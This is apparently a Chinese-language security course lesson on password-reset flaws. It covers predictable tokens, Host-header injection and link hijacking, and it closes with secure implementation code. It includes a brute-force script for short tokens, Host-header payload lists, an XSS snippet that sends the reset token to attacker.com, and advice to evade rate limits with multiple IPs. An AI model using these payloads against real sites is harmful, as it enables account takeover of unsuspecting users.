---
title: Day049：密码重置漏洞
tags:
  - 网络安全
  - 密码重置
  - 认证绕过
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d049
date: 2026-03-12
updated: 2026-01-28
---

# Day049：密码重置漏洞

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 8：认证与逻辑漏洞 |
| **今日主题** | 密码重置流程漏洞 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你忘记了某个网站的密码，点击"忘记密码"，收到一封重置邮件。邮件里有一个链接，点击就能设置新密码。
>
> **问题**：如果这个链接被攻击者获取，岂不是可以重置任何人的密码？
>
> **今天的任务**：学习密码重置流程中的常见漏洞——这是账户接管的黄金通道。

---

## 今日目标

- [ ] 理解密码重置流程
- [ ] 掌握常见的密码重置漏洞
- [ ] 学会利用这些漏洞
- [ ] 完成实战练习

**闯关条件**：成功利用密码重置漏洞获取其他用户账户。

---

## 实战任务（先动手！）

### 任务 1：理解密码重置流程（20 分钟）

**标准流程**：
```
1. 用户点击"忘记密码"
2. 输入邮箱/手机号
3. 服务器生成重置令牌
4. 发送重置链接到用户邮箱/手机
5. 用户点击链接
6. 验证令牌，允许设置新密码
7. 密码更新成功
```

**可能的攻击点**：
```
步骤 2：邮箱验证不严格？
步骤 3：令牌可预测？
步骤 4：链接发送到攻击者？
步骤 5：令牌可被劫持？
步骤 6：令牌验证有缺陷？
步骤 7：可以修改其他用户密码？
```

**记录**：
```
你认为最脆弱的环节：________________
```

---

### 任务 2：令牌可预测漏洞（40 分钟）

**漏洞描述**：重置令牌不够随机，可以被预测或暴力破解

**类型 1：弱令牌生成**
```python
# 漏洞代码：使用时间戳
import time
token = str(int(time.time()))  # 1678234567

# 漏洞代码：使用用户 ID
token = base64.b64encode(str(user_id).encode()).decode()  # MTIzNA==

# 漏洞代码：使用 MD5(email)
token = hashlib.md5(email.encode()).hexdigest()
```

**类型 2：短令牌**
```
# 4 位数字
http://target.com/reset?token=1234
# 可暴力破解：0000-9999

# 6 位字母数字
http://target.com/reset?token=abc123
# 需要更多时间，但仍可能破解
```

**实战测试**：
```python
import requests
import itertools
import string

# 暴力破解 4 位数字令牌
base_url = "http://target.com/reset?token={}&email=victim@email.com"

for token in range(10000):
    url = base_url.format(str(token).zfill(4))
    resp = requests.get(url)
    if "Set New Password" in resp.text:
        print(f"[+] Valid token: {token}")
        break
```

**记录**：
```
发现的弱令牌类型：________________
破解尝试结果：________________
```

---

### 任务 3：Host 头注入（45 分钟）

**漏洞原理**：
```
服务器根据 Host 头生成重置链接
如果可以控制 Host 头，链接就会指向攻击者服务器
```

**正常请求**：
```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@email.com
```

**用户收到的邮件**：
```
Reset your password:
http://target.com/reset?token=abc123
```

**攻击请求**：
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@email.com
```

**用户收到的邮件（被劫持）**：
```
Reset your password:
http://attacker.com/reset?token=abc123
```

**变形技巧**：
```http
# 双 Host 头
Host: target.com
Host: attacker.com

# X-Forwarded-Host
Host: target.com
X-Forwarded-Host: attacker.com

# X-Host
X-Host: attacker.com

# 绝对 URL
GET http://attacker.com/forgot-password HTTP/1.1
Host: target.com
```

**Burp Collaborator 验证**：
```
1. 生成 Burp Collaborator URL
2. 用该 URL 作为 Host
3. 如果收到请求，说明漏洞存在
```

**记录**：
```
Host 头注入测试结果：________________
使用的绕过技巧：________________
```

---

### 任务 4：密码重置链接劫持（35 分钟）

**场景 1：Referer 泄露**
```
重置链接：http://target.com/reset?token=abc123

如果页面包含外部资源（图片、JS），
请求外部资源时会带上 Referer：
GET /image.png HTTP/1.1
Host: external.com
Referer: http://target.com/reset?token=abc123  ← 令牌泄露！
```

**场景 2：重置页面 XSS**
```javascript
// 如果重置页面存在 XSS
<script>
new Image().src = 'http://attacker.com/steal?token=' +
    new URLSearchParams(location.search).get('token');
</script>
```

**场景 3：URL 参数污染**
```http
# 原始请求
POST /forgot-password HTTP/1.1

email=victim@email.com

# 参数污染
email=victim@email.com&email=attacker@email.com

# 某些服务器可能发送给两个邮箱
# 或发送给最后一个邮箱
```

**场景 4：邮件服务接管**
```
如果受害者邮箱可被接管：
1. 过期域名重新注册
2. 子域名接管
3. 邮箱服务商漏洞

则可以收到重置邮件
```

**记录**：
```
尝试的劫持方法：________________
成功的方法：________________
```

---

### 任务 5：其他密码重置漏洞（30 分钟）

**漏洞 1：令牌不过期**
```
1. 获取一个有效的重置令牌
2. 不使用它
3. 一周后再用，仍然有效

问题：令牌应该有短暂的有效期
```

**漏洞 2：令牌可复用**
```
1. 使用令牌重置密码
2. 用同一个令牌再次重置

问题：令牌使用后应该失效
```

**漏洞 3：密码重置后会话不失效**
```
1. 攻击者获取受害者的会话
2. 受害者发现被盗，重置密码
3. 攻击者的会话仍然有效！

问题：重置密码后应该强制所有会话登出
```

**漏洞 4：安全问题绕过**
```
# 某些系统使用安全问题
# 但安全问题可能在其他地方泄露

"你的宠物叫什么名字？"
→ 查看用户社交媒体
→ "我的狗狗 Max 今天生日！"
```

**漏洞 5：短信验证码弱点**
```
# 4-6 位验证码
# 无速率限制
→ 可暴力破解

# 验证码在响应中返回
→ 直接读取
```

**记录**：
```
发现的其他漏洞：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解密码重置流程 | 15 分 |
| 成功识别弱令牌 | 20 分 |
| 成功利用 Host 头注入 | 25 分 |
| 掌握链接劫持技术 | 20 分 |
| 了解其他重置漏洞 | 20 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 安全的密码重置实现

```python
import secrets
import datetime

# 1. 生成强随机令牌
token = secrets.token_urlsafe(32)  # 256 位随机

# 2. 存储时哈希令牌
token_hash = hashlib.sha256(token.encode()).hexdigest()
store_in_db(user_id, token_hash, expiry=datetime.now() + timedelta(hours=1))

# 3. 验证时比较哈希
def verify_token(token, user_id):
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    stored = get_from_db(user_id)

    if not stored:
        return False
    if stored.expiry < datetime.now():
        return False
    if not secrets.compare_digest(token_hash, stored.token_hash):
        return False

    # 4. 使用后立即删除
    delete_from_db(user_id)
    return True
```

### 常见漏洞代码

```python
# 漏洞 1：可预测令牌
token = str(user.id) + str(int(time.time()))

# 漏洞 2：使用 Host 头生成链接
reset_link = f"http://{request.headers['Host']}/reset?token={token}"

# 漏洞 3：令牌不过期
# 存储时没有设置过期时间

# 漏洞 4：令牌可复用
# 验证后没有删除令牌
```

### 账户接管影响

```
密码重置漏洞 = 账户完全接管

可能的影响：
- 登录受害者账户
- 访问敏感数据
- 冒充受害者
- 横向移动到其他账户
- 如果是管理员账户，控制整个系统
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 邮件延迟 | 测试令牌已过期 | 检查令牌有效期，快速测试 |
| Host 头被过滤 | 注入无效 | 尝试各种变形和绕过 |
| 速率限制 | 暴力破解被阻止 | 使用多 IP、慢速破解 |
| 令牌在 Cookie 中 | 不在 URL 里 | 检查所有响应头和 Cookie |

---

## 知识卡片速查

### 密码重置测试清单

```
1. 分析令牌格式和熵
2. 测试 Host 头注入
3. 检查令牌有效期
4. 测试令牌复用
5. 检查 Referer 泄露
6. 测试参数污染
7. 验证重置后会话处理
```

### Host 头注入 Payload

```http
Host: attacker.com
Host: target.com\n Host: attacker.com
Host: target.com:@attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
```

### 弱令牌特征

```
短长度：< 10 字符
可预测模式：时间戳、用户 ID、序号
低熵：只有数字、只有小写字母
可逆编码：Base64、URL 编码
```

---

## 常见问题

**Q1：如何判断令牌是否可预测？**

A1：
1. 多次请求重置，收集多个令牌
2. 分析令牌的格式和模式
3. 尝试解码（Base64、Hex）
4. 检查是否与时间、用户 ID 相关

**Q2：Host 头注入有什么前提条件？**

A2：
- 服务器使用 Host 头生成链接
- 没有验证 Host 头的有效性
- 邮件发送功能使用服务器生成的链接

**Q3：如何防御这些攻击？**

A3：
1. 使用强随机令牌（secrets.token_urlsafe）
2. 设置短暂有效期（1 小时内）
3. 令牌使用后立即失效
4. 不使用 Host 头生成链接
5. 重置密码后强制登出所有会话

---

## 明日预告

**Day 050：验证码绕过**

明天你将：
- 学习验证码的常见绕过技术
- 掌握短信/邮箱验证码攻击
- 实战验证码暴力破解

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 发现的重置漏洞 | |
| 使用的攻击技术 | |
| 今日收获 | |

---

> **导师点评**：
>
> 密码重置是账户安全的"后门"——合法的后门。
>
> 这个功能设计的初衷是帮用户找回账户，但如果实现有问题，就变成了帮攻击者接管账户。
>
> Host 头注入特别有趣：攻击者根本不需要破解令牌，只需要让链接发到自己的服务器。受害者自己点击链接，就把令牌送过来了。
>
> **记住：密码重置流程和登录一样重要，甚至更重要——因为它可以绕过密码**。

```bash
echo "Day 049 Complete! 密码重置漏洞猎人！"
```
